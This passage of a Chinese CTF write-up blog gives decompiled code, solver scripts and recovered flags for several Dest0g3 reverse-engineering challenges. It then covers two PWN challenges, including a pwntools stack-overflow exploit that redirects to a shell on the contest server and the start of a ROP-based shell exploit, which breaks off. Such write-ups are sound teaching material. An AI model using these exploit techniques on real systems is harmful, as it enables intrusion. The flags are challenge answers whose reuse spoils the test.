class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先加下标值再异或247，最后校验密文，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">179</span>, <span class="number">145</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">195</span>, <span class="number">155</span>, <span class="number">206</span>, <span class="number">117</span>, <span class="number">207</span>, <span class="number">156</span>, <span class="number">154</span>, <span class="number">133</span>, <span class="number">133</span>, <span class="number">205</span>, <span class="number">184</span>, <span class="number">132</span>, <span class="number">170</span>, <span class="number">125</span>, <span class="number">189</span>, <span class="number">187</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">150</span>, <span class="number">113</span>, <span class="number">141</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">191</span>, <span class="number">115</span>, <span class="number">168</span>, <span class="number">163</span>, <span class="number">156</span>, <span class="number">131</span>, <span class="number">101</span>, <span class="number">158</span>, <span class="number">87</span>]</span><br><span class="line">flag = [(c[i]^<span class="number">247</span>)-i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;0bcgf-AdMy892-KobPW-hB6LTqG&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="hi"><a href="#hi" class="headerlink" title="hi"></a>hi</h3><p><code>main()</code> 代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-ACh]</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+8h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> enc[<span class="number">45</span>]; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="type">char</span> str[<span class="number">100</span>]; <span class="comment">// [rsp+40h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  *(_QWORD *)enc = <span class="number">0x9F8E7A1CC6486497</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">8</span>] = <span class="number">0x69EEF382E760BD46</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">16</span>] = <span class="number">0xB9C017E2E30EF749</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">24</span>] = <span class="number">0x98410148A430392C</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;enc[<span class="number">32</span>] = <span class="number">0xE80E7411E5B5A939</span>LL;</span><br><span class="line">  *(_DWORD *)&amp;enc[<span class="number">40</span>] = <span class="number">0xA58BFDAC</span>;</span><br><span class="line">  enc[<span class="number">44</span>] = <span class="number">109</span>;</span><br><span class="line">  fwrite(<span class="string">&quot;input: &quot;</span>, <span class="number">1uLL</span>, <span class="number">7uLL</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  fgets(str, <span class="number">46</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(str) != <span class="number">45</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = <span class="number">23</span> * str[i];</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> <span class="type">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + (_BYTE)v1 + x[i] - ((<span class="type">unsigned</span> <span class="type">int</span>)((v1 + x[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) != enc[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密逻辑中 <code>((v1 + x[i]) &gt;&gt; 31) &gt;&gt; 24)</code> 互减抵消，剩下 <code>23 * str[i] + x[i] == enc[i]</code>，简单还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">enc = [<span class="number">151</span>, <span class="number">100</span>, <span class="number">72</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">122</span>, <span class="number">142</span>, <span class="number">159</span>, <span class="number">70</span>, <span class="number">189</span>, <span class="number">96</span>, <span class="number">231</span>, <span class="number">130</span>, <span class="number">243</span>, <span class="number">238</span>, <span class="number">105</span>, <span class="number">73</span>, <span class="number">247</span>, <span class="number">14</span>, <span class="number">227</span>, <span class="number">226</span>, <span class="number">23</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">44</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">164</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">65</span>, <span class="number">152</span>, <span class="number">57</span>, <span class="number">169</span>, <span class="number">181</span>, <span class="number">229</span>, <span class="number">17</span>, <span class="number">116</span>, <span class="number">14</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">253</span>, <span class="number">139</span>, <span class="number">165</span>, <span class="number">109</span>]</span><br><span class="line">x = [<span class="number">123</span>, <span class="number">81</span>, <span class="number">243</span>, <span class="number">90</span>, <span class="number">204</span>, <span class="number">57</span>, <span class="number">249</span>, <span class="number">146</span>, <span class="number">28</span>, <span class="number">158</span>, <span class="number">88</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">247</span>, <span class="number">253</span>, <span class="number">74</span>, <span class="number">62</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">44</span>, <span class="number">77</span>, <span class="number">12</span>, <span class="number">112</span>, <span class="number">177</span>, <span class="number">59</span>, <span class="number">141</span>, <span class="number">37</span>, <span class="number">237</span>, <span class="number">145</span>, <span class="number">177</span>, <span class="number">115</span>, <span class="number">141</span>, <span class="number">130</span>, <span class="number">230</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">32</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">166</span>, <span class="number">157</span>, <span class="number">50</span>]</span><br><span class="line">flag = [((enc[i]-x[i])*gmpy2.invert(<span class="number">23</span>,<span class="number">256</span>))%<span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;Dest0g3&#123;f982cd79-d7a3-0874-aa0b-a5b37e4445c8&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZMATH"><a href="#EZMATH" class="headerlink" title="EZMATH"></a>EZMATH</h3><p>ILSpy查看dll文件，主要逻辑代码：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> &lt;Main&gt;$(<span class="built_in">string</span>[] args)</span><br><span class="line">&#123;</span><br><span class="line">Console.Write(<span class="string">&quot;Input your flag:&quot;</span>);</span><br><span class="line"><span class="built_in">string</span> text = Console.ReadLine();</span><br><span class="line"><span class="keyword">if</span> (!FormatChecker(text))</span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">string</span> s = text.Replace(<span class="string">&quot;-&quot;</span>, <span class="built_in">string</span>.Empty);</span><br><span class="line"><span class="built_in">byte</span>[] second = Checker.Encrypt2(Checker.Encrypt1(Encoding.ASCII.GetBytes(s)));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">32</span>]</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>,</span><br><span class="line"><span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>,</span><br><span class="line"><span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>,</span><br><span class="line"><span class="number">227</span>, <span class="number">109</span></span><br><span class="line">&#125;.SequenceEqual(second))</span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;right!&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">&quot;Your flag is Dest0g3&#123;&quot;</span> + text + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">err();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">err</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">Console.WriteLine(<span class="string">&quot;err!&quot;</span>);</span><br><span class="line">Environment.Exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">bool</span> <span class="title">FormatChecker</span>(<span class="params"><span class="built_in">string</span> input</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">Guid result;</span><br><span class="line"><span class="keyword">return</span> Guid.TryParse(input, <span class="keyword">out</span> result);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt1</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">uint</span> <span class="keyword">value</span> = (<span class="built_in">uint</span>)((<span class="built_in">ulong</span>)((<span class="built_in">long</span>)utils.Unpack32(a[(<span class="number">4</span> * i)..(<span class="number">4</span> * (i + <span class="number">1</span>))]) * <span class="number">83987L</span>) % <span class="number">4062393413u</span>L);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">Encrypt2</span>(<span class="params"><span class="built_in">byte</span>[] a</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">List&lt;<span class="built_in">byte</span>&gt; list = <span class="keyword">new</span> List&lt;<span class="built_in">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">ulong</span> num = utils.Unpack64(a[(<span class="number">8</span> * i)..(<span class="number">8</span> * (i + <span class="number">1</span>))]);</span><br><span class="line"><span class="built_in">ulong</span> <span class="keyword">value</span> = num ^ (num &gt;&gt; <span class="number">25</span>);</span><br><span class="line">list.AddRange(BitConverter.GetBytes(<span class="keyword">value</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> list.ToArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入字符串先经 <code>Encrypt1()</code> 以32位形式4位一组做乘法取模运算，再经 <code>Encrypt2()</code> 以64位形式8位一组做xorshift运算，逐步还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">218</span>, <span class="number">49</span>, <span class="number">230</span>, <span class="number">35</span>, <span class="number">65</span>, <span class="number">168</span>, <span class="number">134</span>, <span class="number">53</span>, <span class="number">233</span>, <span class="number">62</span>, <span class="number">212</span>, <span class="number">208</span>, <span class="number">127</span>, <span class="number">224</span>, <span class="number">63</span>, <span class="number">164</span>, <span class="number">36</span>, <span class="number">88</span>, <span class="number">65</span>, <span class="number">138</span>, <span class="number">118</span>, <span class="number">255</span>, <span class="number">107</span>, <span class="number">22</span>, <span class="number">16</span>, <span class="number">239</span>, <span class="number">61</span>, <span class="number">58</span>, <span class="number">130</span>, <span class="number">101</span>, <span class="number">227</span>, <span class="number">109</span>]</span><br><span class="line"></span><br><span class="line">c1 = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_right</span>(<span class="params">m,l</span>):</span><br><span class="line">    length = <span class="number">64</span></span><br><span class="line">    mx = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line">    i,res = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * l &lt; length:</span><br><span class="line">        mask = (mx &lt;&lt; (length - l) &amp; mx) &gt;&gt; i * l</span><br><span class="line">        tmp = m &amp; mask</span><br><span class="line">        m = m ^ tmp &gt;&gt; l &amp; mx</span><br><span class="line">        res += tmp</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">c2 = [invert_right(c1[i], <span class="number">25</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">c3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    c3 += <span class="built_in">list</span>(long_to_bytes(c2[i]))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">c4 = [bytes_to_long(<span class="built_in">bytes</span>(c3[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>)]</span><br><span class="line"></span><br><span class="line">c4 = [(k*inverse(<span class="number">83987</span>,<span class="number">4062393413</span>))%<span class="number">4062393413</span> <span class="keyword">for</span> k <span class="keyword">in</span> c4]</span><br><span class="line"></span><br><span class="line">c5 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    c5 += <span class="built_in">list</span>(long_to_bytes(c4[i]))[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(c5))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;28956fc4c54045a8808d42a5fab4b5f8&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ez-aarch"><a href="#ez-aarch" class="headerlink" title="ez_aarch"></a>ez_aarch</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_8EC();</span><br><span class="line">  func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s just a easy stack overflow.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fun2();</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">fun2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br><span class="line"> </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please leave your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;OK, you can exploit it now.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK, you get it !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>arm的aarch64架构，开了PIE，与后门地址比较发现只有后1个字节不同，把返回地址的尾1字节改为后门地址尾1字节，简单栈溢出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26257</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0x08</span>) + <span class="string">&#x27;\x3c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h3><p>主要代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hackme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1[<span class="number">10</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+2Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+30h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+38h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"> </span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input the length of array:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)abs32(v2) &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\n\n----------------------------------------------------&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choice:\n1.add num\n2.get sum\n3.get avg\n4.exit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;----------------------------------------------------\n&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your choice:&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;avg = %d\n&quot;</span>, v6 / v4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no avg!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;array is too long!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input num&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1[v4++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">        v6 += v1[i];</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>, v6);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;exit!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开始的 <code>scanf</code> 处未检查输入，读入负数可致负溢出，再结合写入数据的第二个 <code>scanf</code>， 可以越栈一直写，最后利用ROP修改返回地址，第一次ROP求libc基地址，第二次ROP可getshell：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span 